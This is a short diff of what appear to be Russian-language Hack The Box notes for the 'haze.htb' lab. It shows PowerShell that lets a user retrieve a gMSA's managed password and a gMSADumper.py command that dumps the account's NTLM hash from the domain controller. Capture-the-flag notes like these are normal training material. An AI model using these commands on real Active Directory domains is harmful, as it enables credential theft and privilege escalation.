@@ -112,8 +112,11 @@ Silvercore_21
 
     если Марк входит в группу администраторов gMSA
     Set-ADServiceAccount -Identity "Haze-IT-Backup$" -PrincipalsAllowedToRetrieveManagedPassword "mark.adams"
+
     Get-ADServiceAccount -Identity "Haze-IT-Backup$" -Properties PrincipalsAllowedToRetrieveManagedPassword
 
     получить NTLM закрытой учетки GMSA
     python gMSADumper.py -u 'mark.adams' -p 'password' -d haze.htb -l dc01.haze.htb
+
+# GenericWrite
 
